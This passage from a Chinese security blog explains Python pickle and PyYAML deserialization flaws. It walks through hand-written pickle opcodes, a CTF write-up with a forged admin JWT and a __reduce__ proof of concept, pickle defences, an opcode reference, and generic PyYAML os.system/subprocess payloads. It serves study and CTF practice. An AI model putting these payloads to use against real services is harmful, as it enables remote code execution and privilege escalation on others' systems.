<h3 id="手撕简单-opcode"><a href="#手撕简单-opcode" class="headerlink" title="手撕简单 opcode"></a>手撕简单 opcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode_str = <span class="string">b"cos\nsystem\n(S'calc.exe'\ntR."</span></span><br><span class="line">pickletools.dis(opcode_str)</span><br><span class="line">pickle.loads(opcode_str)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">'os system'</span></span><br><span class="line">   <span class="number">11</span>: (    MARK</span><br><span class="line">   <span class="number">12</span>: S        STRING     <span class="string">'calc.exe'</span></span><br><span class="line">   <span class="number">24</span>: t        TUPLE      (MARK at <span class="number">11</span>)</span><br><span class="line">   <span class="number">25</span>: R    REDUCE</span><br><span class="line">   <span class="number">26</span>: .    STOP</span><br></pre></td></tr></table></figure>

<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/2.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line">a = <span class="number">123456</span></span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="keyword">import</span> test</span><br><span class="line">opcode_str = <span class="string">b"c__main__\ntest\n(S'a'\nI4\ndb."</span></span><br><span class="line">pickletools.dis(opcode_str)</span><br><span class="line">pickle.loads(opcode_str)</span><br><span class="line">print(test.a)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">'__main__ test'</span></span><br><span class="line">   <span class="number">15</span>: (    MARK</span><br><span class="line">   <span class="number">16</span>: S        STRING     <span class="string">'a'</span></span><br><span class="line">   <span class="number">21</span>: I        INT        <span class="number">4</span></span><br><span class="line">   <span class="number">24</span>: d        DICT       (MARK at <span class="number">15</span>)</span><br><span class="line">   <span class="number">25</span>: b    BUILD</span><br><span class="line">   <span class="number">26</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>备注： 复杂的opcode编写建议使用 <code>pker</code> <a href="https://github.com/EddieIvan01/pker" target="_blank" rel="noopener">https://github.com/EddieIvan01/pker</a></p>
<p>本文暂不对复杂<code>opcode</code> 和绕过姿势做分析</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="第一个-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#第一个-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="第一个 [CISCN2019 华北赛区 Day1 Web2]ikun"></a>第一个 [CISCN2019 华北赛区 Day1 Web2]ikun</h4><ul>
<li>按照提示发现 <code>page = 181</code>看到lv6商品</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/3.png" alt></p>
<ul>
<li>修改折扣，购买物品</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/4.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/5.png" alt></p>
<ul>
<li>修改<code>JWT</code>提权，这里破解操作就不表述</li>
</ul>
<p><code>JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q</code></p>
<p>修改后</p>
<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/6.png" alt></p>
<ul>
<li>按照提示，发现反序列化漏洞</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/7.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/8.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/9.png" alt></p>
<ul>
<li>POC如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetPoc</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt', 'r').read()"</span>, ))</span><br><span class="line"></span><br><span class="line">print(urllib.quote(pickle.dumps(GetPoc())))</span><br></pre></td></tr></table></figure>

<ul>
<li>最终</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/10.png" alt></p>
<h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><ul>
<li><p>自己生产自己消费，那么可以采取对称加密方式，防止中间人篡改 <code>opcode</code></p>
</li>
<li><p>业务上非必要，建议采取其他的方式代替<code>pickle</code></p>
</li>
<li><p>重写pickle库，find_class方法中采用白名单过滤反序列化模块，过滤C R B标签(不建议，有绕过风险)</p>
</li>
</ul>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="opcode-操作码附录"><a href="#opcode-操作码附录" class="headerlink" title="opcode 操作码附录"></a>opcode 操作码附录</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b'\x80'</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b'\x81'</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b'\x82'</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b'\x83'</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b'\x84'</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b'\x85'</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b'\x86'</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b'\x87'</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b'\x88'</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b'\x89'</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b'\x8a'</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b'\x8b'</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b'B'</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b'C'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b'\x8c'</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b'\x8d'</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b'\x8e'</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b'\x8f'</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b'\x90'</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b'\x91'</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b'\x92'</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b'\x93'</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b'\x94'</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b'\x95'</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b'\x96'</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b'\x97'</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b'\x98'</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>python反序列化(pyyaml)浅析</title>
    <url>/2020/11/28/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="python反序列化-pyyaml-浅析"><a href="#python反序列化-pyyaml-浅析" class="headerlink" title="python反序列化(pyyaml)浅析"></a>python反序列化(pyyaml)浅析</h1><p>​    反序列化问题又为对象注入问题，python中反序列化问题，除了<code>pyyaml</code>之外，还有一个<code>pickle</code>也存在反序列化问题，本文只涉及<code>pyyaml</code>包</p>
<p>​    <code>YAML</code>是一种直观的能够被电脑识别的的数据序列化格式，相当于<code>pickle</code> <code>php反序列化</code>容易被人类阅读，类似于XML，但是语法比XML简单得多，开发过程中易当作解析配置文件使用，但同样也存在一定的安全问题。</p>
<a id="more"></a>

<h2 id="Yaml介绍"><a href="#Yaml介绍" class="headerlink" title="Yaml介绍"></a>Yaml介绍</h2><p>​    简单来说，是一个专门用来写配置文件得语言，要比<code>json</code>格式方便。方便人类读写，相对于<code>xml</code> <code>json</code>等，更为轻便得文件格式</p>
<h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><ul>
<li><code>load()</code>：返回一个对象</li>
<li><code>load_all()</code>: 生成一个迭代器</li>
<li><code>dump()</code>: 将一个python对象生成<code>yaml</code>文档</li>
<li><code>dump_all()</code>: 将多个段输出到一起</li>
</ul>
<p>eg:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml_5_3_1</span><br><span class="line"></span><br><span class="line">test_list = [<span class="string">"123"</span>, &#123;<span class="string">"dict"</span>:<span class="string">"123456"</span>&#125;, <span class="number">666</span>]</span><br><span class="line"></span><br><span class="line">test_res = yaml_5_3_1.dump(test_list)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#123;0&#125;"</span>.format(test_res))</span><br><span class="line"></span><br><span class="line">test_list = yaml_5_3_1.load(test_res)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line"></span><br><span class="line">test_list2 = [<span class="string">"456"</span>, &#123;<span class="string">"dict"</span>:<span class="string">"66666"</span>&#125;, <span class="number">777</span>]</span><br><span class="line"></span><br><span class="line">test_res = yaml_5_3_1.dump_all([test_list,test_list2])</span><br><span class="line">print(<span class="string">"----------------------------"</span>)</span><br><span class="line">print(<span class="string">"&#123;0&#125;"</span>.format(test_res))</span><br><span class="line"></span><br><span class="line">test_list_res = yaml_5_3_1.load_all(test_res)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"test_list_res = &#123;0&#125;"</span>.format(test_list_res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test_list_res:</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">- <span class="string">'123'</span></span><br><span class="line">- dict: <span class="string">'123456'</span></span><br><span class="line">- <span class="number">666</span></span><br><span class="line"></span><br><span class="line">test_list = [<span class="string">'123'</span>, &#123;<span class="string">'dict'</span>: <span class="string">'123456'</span>&#125;, <span class="number">666</span>]</span><br><span class="line">----------------------------</span><br><span class="line">- <span class="string">'123'</span></span><br><span class="line">- dict: <span class="string">'123456'</span></span><br><span class="line">- <span class="number">666</span></span><br><span class="line">---</span><br><span class="line">- <span class="string">'456'</span></span><br><span class="line">- dict: <span class="string">'66666'</span></span><br><span class="line">- <span class="number">777</span></span><br><span class="line"></span><br><span class="line">test_list_res = &lt;generator object load_all at <span class="number">0x0000028C354BA190</span>&gt;</span><br><span class="line">[<span class="string">'123'</span>, &#123;<span class="string">'dict'</span>: <span class="string">'123456'</span>&#125;, <span class="number">666</span>]</span><br><span class="line">[<span class="string">'456'</span>, &#123;<span class="string">'dict'</span>: <span class="string">'66666'</span>&#125;, <span class="number">777</span>]</span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="反序列化问题"><a href="#反序列化问题" class="headerlink" title="反序列化问题"></a>反序列化问题</h2><h3 id="版本差异"><a href="#版本差异" class="headerlink" title="版本差异"></a>版本差异</h3><p>​    默认情况下，Pyyaml版本&gt;=5.1，默认安全，&lt;5.1的版本默认不安全，如下代码举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> yaml_5_3_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_old_yaml</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'!!python/object/apply:os.system ["calc.exe"]'</span></span><br><span class="line">    dump_payload = <span class="string">'!!python/object:get_poc.yamlPoc &#123;&#125;'</span></span><br><span class="line">    yaml.load(dump_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_new_yaml</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'!!python/object/apply:os.system ["calc.exe"]'</span></span><br><span class="line">    dump_payload = <span class="string">'!!python/object:get_poc.yamlPoc &#123;&#125;'</span></span><br><span class="line">    yaml_5_3_1.load(dump_payload)  <span class="comment"># 报错</span></span><br><span class="line">    <span class="comment"># yaml_5_3_1.load(dump_payload, Loader=yaml_5_3_1.Loader)  # 指定不安全的loader 弹计算器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># test_old_yaml()  # 弹计算器</span></span><br><span class="line">    test_new_yaml()  <span class="comment"># 报错</span></span><br></pre></td></tr></table></figure>

<p>两次运行效果分别如下:</p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/1.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/2.png" alt></p>
<h3 id="小于5-1的版本"><a href="#小于5-1的版本" class="headerlink" title="小于5.1的版本"></a>小于5.1的版本</h3><ul>
<li>POC的生成</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> yaml_5_3_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yamlPoc</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        os.system(<span class="string">"calc.exe"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dump_payload = yaml_5_3_1.dump(yamlPoc())</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#123;0&#125;"</span>.format(dump_payload))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">!!python/object:__main__.yamlPoc &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>我们拿到反序列化字符串</p>
<ul>
<li>不过这个POC还不能直接使用，报错如下</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/3.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/4.png" alt></p>
<ul>
<li>构造出的POC需要在<code>__main__</code>模块中使用，稍加构造(<code>!!python/object:get_poc.yamlPoc {}</code>)</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/5.png" alt></p>
<p>这样，我们引出了下一个问题，如果<code>get_poc</code>模块不存在，那么构造的POC不会被利用</p>
<ul>
<li>通用的POC</li>
</ul>
<p>这样，我们引用python自带模块构造</p>
<p>通用的部分POC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/object/apply:os.system [<span class="string">"calc.exe"</span>]</span><br><span class="line">!!python/object/new:os.system [<span class="string">"calc.exe"</span>]    </span><br><span class="line">!!python/object/new:subprocess.check_output [[<span class="string">"calc.exe"</span>]]</span><br><span class="line">!!python/object/apply:subprocess.check_output [[<span class="string">"calc.exe"</span>]]</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/6.png" alt></p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​    那么为什么上述<code>payload</code>可以执行呢,分析一波！</p>
<p>首先我们看下<code>Constructor</code>初始化的时候干了啥？拿 <code>!!python/object/apply:os.system [&quot;calc.exe&quot;]</code>举例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/none'</span>,</span><br><span class="line">    Constructor.construct_yaml_null)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/bool'</span>,</span><br><span class="line">    Constructor.construct_yaml_bool)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/str'</span>,</span><br><span class="line">    Constructor.construct_python_str)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/unicode'</span>,</span><br><span class="line">    Constructor.construct_python_unicode)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/bytes'</span>,</span><br><span class="line">    Constructor.construct_python_bytes)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/int'</span>,</span><br><span class="line">    Constructor.construct_yaml_int)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span 